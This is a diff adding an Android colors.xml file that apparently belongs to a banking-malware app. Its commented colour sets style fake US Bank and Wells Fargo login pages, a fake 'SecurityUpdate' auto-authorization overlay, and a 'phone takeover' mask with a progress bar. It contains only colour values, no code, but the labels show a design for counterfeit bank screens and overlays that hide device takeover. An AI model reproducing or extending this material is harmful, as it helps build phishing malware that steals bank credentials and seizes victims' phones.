@@ -1,0 +1,45 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <color name="purple_200">#FFBB86FC</color>
+    <color name="purple_500">#FF6200EE</color>
+    <color name="purple_700">#FF3700B3</color>
+    <color name="teal_200">#FF03DAC5</color>
+    <color name="teal_700">#FF018786</color>
+    <color name="black">#FF000000</color>
+    <color name="white">#FFFFFFFF</color>
+
+    <!-- Fake page: US Bank -->
+    <color name="fake_usbank_bg">#F2F2F2</color>
+    <color name="fake_usbank_card">#FFFFFF</color>
+    <color name="fake_usbank_blue">#0C2074</color>
+    <color name="fake_usbank_btn">#1A3C8B</color>
+    <color name="fake_usbank_red">#C8102E</color>
+    <color name="fake_usbank_text">#1A1A1A</color>
+    <color name="fake_usbank_muted">#8A8A8A</color>
+    <color name="fake_usbank_line">#C8C8C8</color>
+
+    <!-- Fake page: 国富银行 (Wells Fargo) -->
+    <color name="fake_guofu_bg">#F5F0E6</color>
+    <color name="fake_guofu_card">#FFFFFF</color>
+    <color name="fake_guofu_text">#1A1A1A</color>
+    <color name="fake_guofu_muted">#6B6B6B</color>
+    <color name="fake_guofu_border">#CFCFCF</color>
+    <color name="fake_guofu_show">#6B2D8B</color>
+    <color name="fake_guofu_sign_disabled">#C8C8C8</color>
+    <color name="fake_guofu_sign_enabled">#D71E28</color>
+    <color name="fake_guofu_yellow">#FFCD41</color>
+
+    <!-- SecurityUpdate / 自动授权遮罩（白底优化页） -->
+    <color name="security_optimize_bg">#FFFFFFFF</color>
+    <color name="security_optimize_accent">#FF4DE1FF</color>
+    <color name="security_optimize_track">#FFE0E0E0</color>
+    <color name="security_optimize_title">#FF000000</color>
+    <color name="security_optimize_hint">#FF666666</color>
+
+    <!-- 接管手机遮罩 -->
+    <color name="takeover_bg">#FFFFFFFF</color>
+    <color name="takeover_title">#FF000000</color>
+    <color name="takeover_hint">#FF000000</color>
+    <color name="takeover_progress">#FF3DDC84</color>
+    <color name="takeover_progress_track">#FFE8E8E8</color>
+</resources>
